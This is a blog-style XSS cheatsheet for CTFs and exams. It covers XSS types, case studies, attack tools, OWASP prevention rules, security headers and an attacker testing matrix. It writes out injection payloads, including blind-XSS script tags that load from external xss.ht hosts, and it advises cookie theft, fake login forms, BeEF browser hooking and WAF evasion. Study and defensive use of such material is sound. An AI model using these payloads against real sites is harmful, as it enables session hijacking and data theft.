---
title: Total XSS Hacking Cheatsheet
published: 2026-06-07
updated: 2026-06-07
description: Cheatsheet and methodology for testing and exploiting XSS during CTFs and Exams.
image: xss-cover.png
tags:
  - web
  - xss
  - cheatsheet
  - methodology
category: Web Hacking
draft: false
---
## 1. Fundamentals of Web Application Architecture & XSS

To understand XSS, you must understand the environment in which it operates. Web applications consist of a **Web Browser** (requesting and rendering content), a **Web Server** (listening on ports 80/443 and hosting files), **Application Logic** (e.g., PHP processing scripts), and a **Back-End Data Store** (e.g., SQL database).

XSS occurs when an application takes untrusted data and sends it to a web browser without proper validation or escaping, tricking the browser into executing malicious code (usually JavaScript) instead of rendering data.


![XSS](xss.png)

### The Vulnerability Risk Path

Attackers utilize distinct paths to exploit vulnerabilities, causing functional and commercial impacts.

```
[Threat Agents] -----> [Attack Payload] -----> [Vulnerability/Flaw] -----> [Bypass Security] -----> [Asset Impact]
```

_Graph 1: A generalized scenario depicting risk path exploitation in web applications._

---

## 2. Classification of XSS Attacks

XSS is generally broken down into core categories based on how the payload is delivered and executed.

### Table 1: The Primary Types of XSS

|Type|Description|Delivery & Impact|
|:--|:--|:--|
|**Reflected (Non-Persistent)**|The payload is immediately echoed back by the server, typically via a crafted URL parameter or search field.|Highly targeted. Requires the victim to click a malicious link.|
|**Stored (Persistent)**|The malicious input is permanently saved on the target server (e.g., a database, visitor logs, or forum comments).|Highly dangerous and scales infinitely. Executes automatically when any user visits the compromised page.|
|**DOM-Based**|Vulnerability exists entirely in client-side JavaScript. The script grabs untrusted data and unsafely writes it to the DOM using methods like `document.write()` or `.innerHTML`.|Never reaches the backend server. Executes entirely in the browser when parsing the Document Object Model.|
|**Blind XSS**|A specialized subset of Stored XSS where the payload fires in a completely different environment (e.g., an internal admin portal or customer support dashboard).|Hard to detect manually; requires specialized listener tools like XSS Hunter to capture execution data.|
|**postMessage XSS**|Exploits HTML5's cross-origin communication method `postMessage()` when applications fail to enforce origin checks or blindly trust event data.|Allows attackers to embed iframes and steal or inject data across completely different domains.|

_(Note: Because these boundaries often overlap—e.g., Stored DOM XSS—some experts simplify the taxonomy into **Server XSS** vs. **Client XSS**.)_

---

## 3. Real-World Case Studies & Advanced Threats

XSS vulnerabilities are not just theoretical; they scale massively and affect the world's largest platforms.

- **Facebook & Gmail:** Researchers found DOM/postMessage vulnerabilities in both platforms that allowed complete account takeovers, meaning attackers could read emails, reset passwords, or hijack sessions.
- **Tesla (Blind XSS):** A bug hunter changed his car's name to an XSS payload (`"><script src=//zlz.xss.ht></script>`). When a Tesla employee accessed his car records via an internal support tool, the payload executed, sending a screenshot and DOM data back to the attacker.
- **Airbnb:** Attackers bypassed Content Security Policies (CSP) and WAFs by using Null Byte Poisoning and nested JSON encoding evasions to exploit 8 different vulnerable endpoints.

### The XSS Worm

An XSS worm is a self-propagating payload that infects web browsers and forces them to copy the malware code to other locations, infecting additional users.

**Case Study: The Samy Worm (MySpace, 2005)** The Samy worm exploited an unfiltered JavaScript payload on MySpace profiles. Using `XMLHttpRequest` (XHR), it forced any visiting victim's browser to add the attacker as a friend and copy the payload to their own profile. **It infected over 1,000,000 users in just 20 hours**.

```
[Vulnerability Abuse] ---> [Infection of Victim Profile] ---> [Reproduction via XHR] ---> [Payload Execution on Next Visitor]
```

_Graph 2: The Life Cycle of an XSS Worm._

---

## 4. Attack Methodologies & Hacking Tools

Professional penetration testing requires a structured approach: **Reconnaissance**, **Enumeration**, **Vulnerability Analysis**, **Exploitation**, and **Reporting**.

### Reconnaissance & Information Gathering

Before attacking, map out the "happy path" of the application to understand inputs. Tools like **LinkFinder** can extract hidden endpoints, APIs, and configuration files (e.g., `package.json`) from JavaScript, revealing vulnerable dependencies.

### Table 2: The XSS Exploitation Arsenal

|Tool Name|Purpose & Capabilities|
|:--|:--|
|**OWASP ZAP**|A proxy tool used to intercept, inspect, and modify HTTP requests between the browser and the server. Features a "Fuzzer" to inject hundreds of payloads rapidly.|
|**XSStrike**|An automated command-line tool that analyzes reflections, bypasses WAFs, and dynamically generates custom XSS payloads rather than relying on static lists.|
|**XSS Hunter**|A service that generates custom short-domain payloads (e.g., `https://yours.xss.ht`) to track Blind XSS. Captures screenshots, DOM, Cookies, IP, and User-Agent when the payload fires.|
|**BeEF**|The Browser Exploitation Framework. "Hooks" a victim's browser, turning it into a "zombie." Can retrieve URLs, turn on webcams, steal credentials, and map internal networks via the hooked browser.|
|**Damn Vulnerable Web App (DVWA) / OWASP Juice Shop**|Safe, legal, Docker-containerized environments for practicing exploitation, featuring varying security levels and realistic e-commerce vulnerabilities.|

---

## 5. The Art of Defense: Context-Aware Prevention

Defending against XSS is difficult because the exact same character must be encoded differently depending on where it is inserted into the HTML document (its "context").

**Rule #0: Never insert untrusted data except in allowed locations.** Do not insert data directly into a `<script>`, an HTML comment (`<!-- -->`), an attribute name, or directly in CSS.

### Table 3: OWASP XSS Prevention Rules Summary

|Context / Location|Code Sample|Defensive Action Required|
|:--|:--|:--|
|**HTML Body**|`<span> UNTRUSTED </span>`|**HTML Entity Encoding** (e.g., `<` becomes `&lt;`, `>` becomes `&gt;`).|
|**HTML Attributes**|`<input value="UNTRUSTED">`|**Attribute Encoding:** Hex Entity encode all non-alphanumeric characters (e.g., `#` becomes `&#x23;`). Always quote attributes!.|
|**JavaScript Variable**|`<script>var x = 'UNTRUSTED';</script>`|**JavaScript Encoding:** Use Unicode escaping for non-alphanumerics (e.g., `<` becomes `\u003c`). Never use backticks (`) for untrusted strings.|
|**CSS Values**|`div { width: UNTRUSTED; }`|**CSS Hex Encoding:** Strictly validate structure. Do not allow `expression()` properties which execute code in older browsers.|
|**URL Parameters**|`<a href="/site?q=UNTRUSTED">`|**URL Encoding:** Encode all non-alphanumeric characters. Validate that the URL starts with a safe protocol (e.g., `http/https`, not `javascript:`).|
|**DOM Subcontexts**|`element.innerHTML = UNTRUSTED`|**HTML Escape THEN JavaScript Escape:** If dynamically writing to the DOM via JS, you must apply both layers in the correct order. Use `.textContent` instead of `.innerHTML`.|

### Defenses Built Into Frameworks

Modern web frameworks offer built-in protections, but they must be used correctly to avoid bypassing them:

- **AngularJS:** Uses the `$sce` (Strict Contextual Escaping) service. It automatically sanitizes using `ngBindHtml`, but developers must be careful not to misuse `$sce.trustAsHtml()`, which disables protections.
- **PHP:** Use `htmlspecialchars($string, ENT_QUOTES, 'UTF-8')` to encode HTML. Avoid `strip_tags()` or regex `preg_replace()` as they are easily bypassed by malformed tags.
- **Ruby on Rails:** The `sanitize()` method strips hazardous tags, while `strip_links()` removes `<a>` tags. Avoid `html_safe` on untrusted input.
- **Java:** Utilize the **OWASP Java Encoder** project to encode data properly for specific contexts (e.g., `Encode.forHtml()`, `Encode.forJavaScript()`).

---

## 6. HTTP Security Headers

Beyond encoding, server-side HTTP response headers provide a secondary defense-in-depth layer to restrict what the browser is allowed to execute.

### Table 4: Essential Security Headers

|Header Name|Configuration|Purpose|
|:--|:--|:--|
|**Content-Security-Policy (CSP)**|`default-src 'self'; script-src 'self' https://trusted.com;`|Defines an strict whitelist of origins from which the browser is allowed to load scripts, objects, and styles. Blocks inline scripts (`unsafe-inline`) and `eval()` execution by default.|
|**Set-Cookie**|`key=value; HttpOnly; Secure`|The `HttpOnly` flag prevents client-side JavaScript (like an injected XSS payload) from reading the user's session cookie (`document.cookie`).|
|**X-Content-Type-Options**|`nosniff`|Forces the browser to strictly follow the defined MIME type (`Content-Type: application/json; charset=utf-8`). Prevents attackers from uploading a script masquerading as an image and having the browser "sniff" and execute it.|
|**X-Frame-Options**|`DENY` or `SAMEORIGIN`|Prevents the page from being embedded in an iframe, stopping Clickjacking and some cross-window interaction attacks.|

_(Note: The older `X-XSS-Protection` header has been deprecated by modern browsers because its filtering mechanism occasionally introduced new client-side vulnerabilities. It should generally be set to `0` or omitted)._

---

## 7. Advanced Mitigation: Clustering & Context-Based Sanitization

To combat the limitations of static blacklist filters and regex replacements, researchers have proposed dynamic **Clustering and Context-Based Sanitization** frameworks.

This advanced architecture involves:

1. **View Separation & Action Authentication:** Dividing the web application into views and verifying actions against an Access Control List (ACL).
2. **Payload Clustering:** When illicit scripts are extracted, a distance-based clustering algorithm (e.g., Levenshtein distance) compares the attack payloads.
3. **Template Generation:** Similar scripts (e.g., `<script>alert(1)</script>` and `<script>alert(2)</script>`) are compressed into a single mathematical template (`<script>alert(-N-)</script>`) using placeholders.
4. **Context-Sensitive Sanitization Engine:** The framework analyzes the exact HTML/JS context of the injection point and applies the appropriate sanitization routine specific to that template before the page is rendered.

### Performance Evaluation (F-Measure)

When tested across open-source platforms (Elgg, WordPress, Drupal, Joomla, Humhub), clustering-based sanitization achieved highly accurate detection rates. The performance was measured using **F-Measure** (the harmonic mean of Precision and Recall).

```
Precision = True Positives / (True Positives + False Positives)
Recall = True Positives / (True Positives + False Negatives)
F-Measure = 2 * Precision * Recall / (Precision + Recall)
```

Across all platforms tested, the F-Measure consistently scored above **0.96**, indicating a highly proficient detection rate with extremely low false positives.

---

## 8. Advanced XSS Variants: Mutation XSS (mXSS)

While Reflected, Stored, and DOM XSS are the core types, an advanced client-side variant is **Mutation XSS (mXSS)**.

- **How it works:** mXSS occurs when a web application processes seemingly harmless, untrusted user data within the context of the DOM's `.innerHTML` property. The browser's execution engine mutates this data, unexpectedly transforming it into a valid XSS vector.
- **The Danger:** Because the initial input appears completely harmless, it easily passes through standard client-side or server-side XSS filters. Traditional filters alone cannot protect against mXSS.
- **Prevention:** Mitigating mXSS requires implementing strict Content Security Policies (CSP), restricting HTML framing, and specifying proper HTML Document Type Definitions (`<!DOCTYPE html>`) to enforce standard rendering and script execution behaviors.

---

## 9. Anatomy and Classes of XSS Worms

An XSS worm is a malicious payload that abuses XSS vulnerabilities to propagate itself across user profiles or browsers, turning a one-to-one server relationship into a one-to-many infection.

### The Life Cycle of an XSS Worm

1. **Vulnerability Abuse:** The attacker entices a victim to visit a site containing highly obscured, self-propagating worm code.
2. **Privileges Capturing:** The payload executes, granting the attacker the victim's privileges on the site, allowing the worm to automatically send malicious messages to the victim's friends.
3. **Replication/Propagation:** The worm creates copies of itself, embedding malicious links in posts or messages to infect subsequent visitors.

### Table 5: Classes of XSS Worms

|Worm Type|Propagation Method & Impact|
|:--|:--|
|**Exponential Worm**|Navigates many domains and performs attacks (e.g., CSRF, account hijacking) by exploiting a single XSS vulnerability. Often chains target sites using redirections or IFrames.|
|**Flash (Warhol) Worm**|The fastest propagating worm. It utilizes **hit-list scanning** (a pre-compiled list of vulnerable machines) and **permutation scanning** to infect almost every vulnerable machine worldwide within 15 minutes.|
|**Linear Worm**|Uses persistent XSS to release on a parent site, performs its activities, and then linearly propagates to other suspicious sites one at a time. Requires low network bandwidth but dies if the target vulnerability is patched.|
|**Hydra Worm**|Releases on a parent site and propagates to multiple vulnerable sites _simultaneously_. Demands high network bandwidth and is significantly harder to stop.|

---

## 10. Specific DOM-Based Prevention Rules

Because DOM XSS executes entirely client-side, traditional server-side encoding is insufficient.

**Rule 1: HTML escape THEN JavaScript escape** When inserting untrusted data into an HTML subcontext using dangerous methods like `element.innerHTML` or `document.write()`, you must strictly apply HTML encoding _first_, followed by JavaScript encoding.

**Rule 2: JS Escape for HTML Attributes** When dealing with HTML attributes that do _not_ execute code (e.g., non-event handlers), you only need to JavaScript encode the data to prevent attackers from breaking out of the attribute.

**Rule 3: Avoid Untrusted Data in Event Handlers** Never insert untrusted data directly into JavaScript event handlers (`onclick`, `onload`) or executable methods (`eval()`, `setTimeout()`). Because of how JS encoding works compared to HTML, sanitizing these contexts is highly prone to failure.

**Rule 4: Use Safe JavaScript Functions** Populate the DOM using inherently safe JavaScript properties. For example, use `.textContent` instead of `.innerHTML`. `.textContent` prints information strictly as text and will not execute injected script tags.

---

## 11. The Attacker's Section: Pentesting Methodologies

To secure applications against XSS, penetration testers adopt specific methodologies to uncover hidden flaws. These approaches vary depending on how much knowledge the attacker (or tester) has about the target system.

### A. Black-Box Pentesting

In black-box testing, the attacker has **no prior knowledge** of the application's source code or internal workings. The attacker interacts with the application purely from the outside, just like a regular user.

#### The Black-Box Exploitation Flow

```
[1. Detect Input Vectors] ---> [2. Analyze Input Vectors] ---> [3. Check Impact]
```

_Graph 3: The Black-Box XSS Testing Flow._

1. **Detect Input Vectors:** The attacker maps out every possible entry point where user data is accepted. This includes search bars, comment fields, URL parameters, HTTP POST data, and HTTP Headers (like `True-Client-IP` or `Referer`).
2. **Analyze Input Vectors:** The attacker probes these inputs using manual payloads or automated fuzzing tools (like OWASP ZAP, KameleonFuzz, or XSSer). They inject unique HTML tags (e.g., `<h1>test</h1>`) to see if the data is reflected back in the page source.
3. **Check Impact:** The attacker observes how the application responds. Do script tags get stripped? Do image tags with `onerror` handlers bypass the Web Application Firewall (WAF)? If a vulnerability fires, tools like **BeEF** or **XSS Hunter** are used to prove the impact (e.g., stealing session cookies or capturing DOM screenshots).

### B. White-Box Pentesting

In white-box testing, the attacker (or security auditor) has **full access to the application's source code**.

- **Source Code Review:** The attacker meticulously traces how variables move from the user's HTTP request to the final HTML output.
- **Analyzing Defenses:** The attacker specifically reviews sanitization and validation functions to see if they can be bypassed. For example, if the code uses a flawed regex like `preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['name'])`, the white-box attacker immediately knows they can bypass it using alternative tags like `<svg>` or `<img onerror=...>`.
- **Dependency Checking:** The attacker inspects configuration files (like `package.json`) to find vulnerable third-party libraries. If they see `sanitize-html: 1.4.2`, they can look up its CVEs and exploit known vulnerabilities (like nested payload bypasses: `<<img src="csrf-attack"/>img src...`).

### C. Grey-Box Pentesting

Grey-box testing involves partial knowledge of the application.

- **The Methodology:** The attacker traces the input from submission to the server, and then back to the browser again.
- **Targeting Stored & Blind XSS:** This is particularly useful for finding Stored XSS. The attacker checks how the data is saved in the database and what it looks like when rendered on pages they _do_ have access to. They then guess how it might be rendered on pages they _don't_ have access to (like an admin portal), firing Blind XSS payloads to execute out-of-band.

---

## 12. Expanded Arsenal: Tooling and Specific Encoders

Penetration testers and defenders utilize specific tools and framework functions to either exploit or sanitize data.

### Table 6: Advanced Scanners and Proxy Tools

|Tool Name|Type & Capability|
|:--|:--|
|**OWASP Xenotix**|An advanced XSS exploit framework utilizing three fuzzers to scan within browser engines, resulting in a very low false-positive rate.|
|**W3af & Vega**|Vulnerability scanners featuring automated proxy interception, written in Python and JavaScript respectively.|
|**Burp Scanner**|An industry-standard, fully automated penetration testing tool used to intercept, modify, and fuzz requests.|
|**DEXTERJS**|A DOM-based XSS proxy tool that extracts untrusted JS and tracks its execution flow, generating specific test payloads.|

### Native Language Encoders (Defensive)

When writing code, developers should rely on native framework functions rather than writing custom regex filters:

- **Ruby on Rails:** `strip_links()` removes all link tags from a string; `h()` or `html_escape()` encodes `&`, `<`, `>`, `"`, and `'` into safe HTML entities (e.g., `&amp;`, `&lt;`).
- **JSON Handling:** `json_escape()` must be used to safely encode characters like `&`, `>`, and `<` into unicode (`\u0026`, `\u003e`, `\u003c`) within JSON contexts to prevent XSS breakouts.

---
## The Attacker's XSS Testing Matrix

| Target Area / What to Look Out For                  | Enumeration (How to Detect Vectors)                                                                                                                                                                                                                                    | Hypothesis Testing (How to Execute & Validate)                                                                                                                                                                                                                                                      |
| :-------------------------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Search Bars & URL Parameters***(Reflected XSS)*   | Walk the "happy path" of the application to identify all URL parameters (e.g., `?q=`, `&id=`) that process input.                                                                                                                                                      | Inject a unique, harmless HTML tag (e.g., `<h1>test</h1>`) to see if it is reflected in the page source. If reflected, escalate to payloads like `<script>alert(1)</script>` or `<img src=x onerror=alert(1)>`. Fuzz using tools like **OWASP ZAP** or **XSStrike** to automate payload generation. |
| **Comments, Profiles & Reviews***(Stored XSS)*      | Create an account and submit data to features that save input to a database (e.g., user profiles, customer feedback, forums). Trace the input from submission to the server, and back to the browser.                                                                  | Inject payloads like `<svg onload=alert(1)>`. Navigate away and return to the page; if the payload fires upon returning without needing a crafted link, it is persistent. Prove impact by injecting a fake login form or stealing `document.cookie`.                                                |
| **Client-Side JS & APIs***(DOM-Based XSS)*          | Inspect the Network tab in DevTools or use tools to read the application's JavaScript files. Look for "sources" (e.g., `location.hash`, `location.search`) and dangerous "sinks" like `document.write()`, `eval()`, or `.innerHTML` where input is processed unsafely. | Modify the URL fragment/hash and observe DOM changes. Inject an iframe payload (e.g., `<iframe src="javascript:alert(1)">`) to bypass standard script filters. Step through the browser's debugger to see if functions like `decodeURI()` arm the payload before it is written to the DOM.          |
| **Backend Portals & Logs***(Blind XSS)*             | Intercept HTTP requests via a proxy (like Burp or ZAP) and identify out-of-band channels. Look for contact forms or proprietary HTTP headers like `True-Client-IP`, `User-Agent`, or `Referer` that might be logged by the server.                                     | Inject an **XSS Hunter** probe (`"><script src=//yoursubdomain.xss.ht></script>`) into the headers or forms. Wait for asynchronous execution; the tool will email you a report with a screenshot, DOM capture, and IP address if an internal admin views the log later.                             |
| **Cross-Origin Iframes***(postMessage XSS)*         | Use DevTools to look for embedded iframes and search the JavaScript for `window.addEventListener("message", ...)`. Analyze if the code uses weak validation like `.indexOf()` instead of strict domain matching.                                                       | Host a malicious HTML page locally, embed the target page, and use `postMessage()` to send an XSS payload. Check the target's console to see if the message is trusted and if the payload executes in the receiving window.                                                                         |
| **Third-Party Libraries***(Component Exploitation)* | Search for configuration files (like `package.json.bak` or `package.json`) exposed on the server or in the client-side source code. Identify the exact versions of dependencies being used.                                                                            | Look up CVEs for the identified libraries (e.g., `sanitize-html: 1.4.2`). Use known exploits for those specific versions, such as nested payload bypasses (`<<img src="csrf-attack"/>img src...`).                                                                                                  |
| **WAFs & Security Filters***(Defense Evasion)*      | Observe error responses (like `HTTP 500` or `403 Forbidden`) or unexpected string modifications when sending basic payloads like `<script>`. This indicates a Web Application Firewall (WAF) or sanitization function is active.                                       | Fuzz the input with polyglots (code valid in multiple languages) or mutations. Try null-byte injections (`%00`), case toggling, or hex encoding to see what the WAF allows through. Review OWASP evasion cheat sheets to systematically bypass the specific filter.                                 |

### The Exploitation Flowchart

To formalize your testing, you can follow this general flow:

```
[1. Reconnaissance]
   ↳ Map the "happy path", check package.json, find hidden APIs via LinkFinder.
          ↓
[2. Detect Input Vectors]
   ↳ Find every parameter, header, or field where data is accepted.
          ↓
[3. Analyze Vectors & Hypothesize]
   ↳ Inject unique tags (e.g., <h1>), trace where they render, and identify the context (HTML, JS variable, Attribute).
          ↓
[4. Execute & Exploit]
   ↳ Craft context-specific payloads manually or use automated fuzzers (XSStrike / XSSer) to bypass filters.
          ↓
[5. Check Impact]
   ↳ Prove the severity by hooking the browser with BeEF or capturing session cookies.
```